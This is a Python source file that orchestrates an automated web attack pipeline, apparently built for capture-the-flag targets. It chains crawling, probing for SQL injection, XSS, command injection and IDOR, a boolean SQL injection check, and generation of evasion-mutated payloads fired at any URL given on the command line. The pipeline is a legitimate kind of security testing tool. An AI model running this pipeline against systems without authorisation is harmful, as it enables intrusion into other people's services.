# infurnex/agent_controller.py
import logging # structured reporting framework
from typing import Dict, Any, List, Optional # python type engine

# Import all deterministic sub-modules constructed across the project
from session_manager import create_session # state mapping
from recon_engine import endpoint_crawler, robots_parser # mapping tools
from probing_engine import probe_reflection, probe_sql_injection, probe_command_injection, probe_state_manipulation, probe_state_enumeration # heuristic tools
from response_diff_engine import simhash_diff, status_code_diff # mathematical proofs
from payload_engine import generate_contextual_payloads, generate_mutations, rank_payloads, sync_payload_sources # exploit constructors
from strategy_engine import select_attack_strategy, rank_targets # decision tools
from exploit_executor import execute_payload_batch # network launch loop
from flag_detector import detect_flag, extract_flag # final verification checks
import httpx # required for baseline request

import sys # for breaking out of execution strings

# Stdout structure configurations
logging.basicConfig(level=logging.INFO, format='%(asctime)s - CONTROLLER - %(message)s')

def collect_attack_surface(target_url: str) -> Dict[str, Any]:
    # Phase 1: Executes recon algorithms against the primary URL
    logging.info(f"--- PHASE 1: RECONNAISSANCE against {target_url} ---")
    attack_surface = endpoint_crawler(target_url) # run BFS spider
    hidden_paths = robots_parser(target_url) # text configure extraction
    attack_surface["endpoints"].extend(hidden_paths) # merge route maps
    return attack_surface # yield total application map

def test_parameters(ranked_targets: List[Dict[str, str]]) -> List[Dict[str, Any]]:
    # Phase 2: Fires non-destructive probes at high-priority parameters
    logging.info(f"--- PHASE 2: ACTIVE PROBING ---")
    signals = [] # output schema 
    
    # Cap testing to the top 5 targets to save time during MVP execution
    testing_pool = ranked_targets[:5] 
    for target in testing_pool: # iterate list
        endpoint = target["endpoint"] # parse endpoint
        parameter = target["parameter"] # parse param
        location = target.get("location", "query") # isolate location context
        method = target.get("method", "GET") # isolate http verb
        
        # Fire reflection heuristic (XSS/SSTI check)
        ref_signal = probe_reflection(endpoint, parameter, location, method) 
        if ref_signal["confidence"] > 0: # only append positive signals
            signals.append(ref_signal)
            
        # Fire database heuristic (SQLi check)
        sql_signal = probe_sql_injection(endpoint, parameter, location, method)
        if sql_signal["confidence"] > 0: # only append positive signals
            signals.append(sql_signal)
            
        # Fire timing heuristic (Command / Code eval check)
        cmd_signal = probe_command_injection(endpoint, parameter, location, method)
        if cmd_signal["confidence"] > 0: # only append positive signals
            signals.append(cmd_signal)
            
        # Fire State Manipulation logic (IDOR, Auth Bypass, Logic)
        try: # Fetch a safe baseline explicitly for diff algorithms
            baseline_resp = httpx.get(endpoint, verify=False, timeout=5.0) 
            state_signal = probe_state_manipulation(endpoint, parameter, baseline_resp, location, method) # invoke difference logic
            if state_signal["confidence"] > 0: # check heuristic confidence
                signals.append(state_signal) # pass mapping forward
                
            # Fire State Enumeration logic (specifically for cookies acting as states/indexes)
            if location == "cookie":
                state_enum_signal = probe_state_enumeration(endpoint, parameter, baseline_resp, location, method) # invoke generic enumerator mapping
                if state_enum_signal["confidence"] > 0: # check heuristic confidence
                    signals.append(state_enum_signal) # pass alert mappings forward
                    
        except Exception as e: # Catch baseline lookup failing
            logging.error(f"Could not reach endpoint for state probing/enumeration: {e}")
            
    return signals # return mathematical confidence array

def confirm_vulnerability(endpoint: str, parameter: str) -> bool:
    # Phase 3: Mathematically proves a boolean vulnerability via response diffing
    logging.info(f"--- PHASE 3: DIFFERENTIAL VULNERABILITY CONFIRMATION ---")
    
    # Send a baseline True request (e.g. 1=1)
    true_url = endpoint.replace(f"{parameter}=", f"{parameter}=1+AND+1=1")
    # Send a baseline False request (e.g. 1=0)
    false_url = endpoint.replace(f"{parameter}=", f"{parameter}=1+AND+1=0")
    
    try: # wrap in local offline network handling
        true_resp = httpx.get(true_url, verify=False, timeout=5.0) # execute True payload
        false_resp = httpx.get(false_url, verify=False, timeout=5.0) # execute False payload
        
        # Mathematically diff the two DOM arrays
        diff = simhash_diff(true_resp.text, false_resp.text)
        if diff["is_significant"]: # if True/False resulted in highly different pages
            logging.info("Vulnerability mathematically confirmed via Simhash difference!")
            return True # proof
            
    except Exception as e: # ignore connection crashes here
        logging.warning(f"Diff execution failed: {e}")
        
    return False # null proof

def generate_payloads(strategy: Dict[str, Any]) -> List[str]:
    # Phase 4: Construct active exploit templates based on confirmed signals
    logging.info(f"--- PHASE 4: PAYLOAD GENERATION ---")
    
    # Stub contextual intelligence structure format
    context = {
        "vulnerability": strategy["vulnerability"], # parsed from strategy planner
        "server_stack": "unknown" # stub backend knowledge
    }
    
    # Request payloads from context-aware dictionary mappings
    base_payloads = generate_contextual_payloads(context)
    
    # Apply evasion algorithm generation 
    amplified_payloads = generate_mutations(base_payloads)
    
    # Execute numerical logic sorting 
    optimal_payloads = rank_payloads(amplified_payloads)
    
    return optimal_payloads # yield array of raw execution strings

def launch_exploit(session: Dict[str, Any], endpoint: str, parameter: str, payloads: List[str], method: str, location: str) -> Optional[str]:
    # Phase 5: Fire active exploit payloads and scan for the objective
    logging.info(f"--- PHASE 5: EXPLOIT EXECUTION ---")
    
    # Pass arrays to executor module
    results = execute_payload_batch(session, endpoint, parameter, payloads, method, location)
    
    for result in results: # loop executions
        resp = result["response"] # extract HTTP response from dictionary schema
        # Phase 6: Scan all responses dynamically for objective logic
        if detect_flag(resp.text): # boolean evaluation
            flag = extract_flag(resp.text) # specific string isolation
            return flag # return raw flag early to terminate
            
    logging.warning("Batch execution finished. Flag not found.") # loop termination warn
    return None # yield null on failure

def run_infurnex(target_url: str) -> None:
    # Master orchestration entrypoint
    logging.info("=========================================")
    logging.info(f"INFURNEX AUTOMATED PENTEST INITIALIZED")
    logging.info(f"TARGET: {target_url}")
    logging.info("=========================================")

    # Initialize State Machine Runtime
    session = create_session()
    
    # Init offline resources
    sync_payload_sources()

    # Pipeline Step 1: Reconnaissance
    surface = collect_attack_surface(target_url)
    if not surface["endpoints"]:
        logging.error("Recon failed to find any endpoints. Terminating.")
        sys.exit(1)
        
    # Pipeline Step 2: Target Prioritization
    ranked_targets = rank_targets(surface)
    if not ranked_targets:
        logging.error("No fuzzable parameters discovered. Terminating.")
        sys.exit(1)

    # Pipeline Step 3: Vulnerability Probing
    signals = test_parameters(ranked_targets)
    if not signals:
        logging.warning("No clear vulnerability signals detected by probes.")
        # We could fallback to LLM here in a hybrid system
        
    # Pipeline Step 4: Strategy Selection
    strategy = select_attack_strategy(signals)
    if not strategy["parameter"]:
        logging.error("Strategy engine failed to select a viable attack path. Terminating.")
        sys.exit(1)
        
    target_param = strategy["parameter"]
    
    # Optional logic step: Mathematical Proof
    # confirm_vulnerability("http://target.local/?id=", target_param) # Example stub hook

    # Pipeline Step 5: Payload Formulation
    payloads_to_fire = generate_payloads(strategy)
    
    # Match network method dynamically with chosen target parameter
    method = "GET" # primitive default
    location = "query" # primitive default
    for target in ranked_targets:
        if target["parameter"] == target_param:
            method = target["method"]
            location = target.get("location", "query")
            target_endpoint = target["endpoint"]
            break

    # Pipeline Step 6: Executor loop
    flag = launch_exploit(session, target_endpoint, target_param, payloads_to_fire, method, location)

    # Pipeline Step 7: Final state handling
    if flag:
        logging.info("=========================================")
        logging.critical(f"EXPLOIT SUCCESSFUL. FINAL FLAG: {flag}")
        logging.info("=========================================")
    else:
        logging.error("Exploitation pipeline exhausted without finding a flag.")
        
# --- EXAMPLE USAGE BLOCK ---
if __name__ == "__main__":
    # Parses the target URL dynamically from the command-line arguments
    if len(sys.argv) < 2: # check argument length
        print("Usage: python3 agent_controller.py <target_url>") # print helpful usage
        sys.exit(1) # terminate securely
        
    user_target = sys.argv[1] # extract provided argument
    
    run_infurnex(user_target) # execute loop pipeline with dynamic input
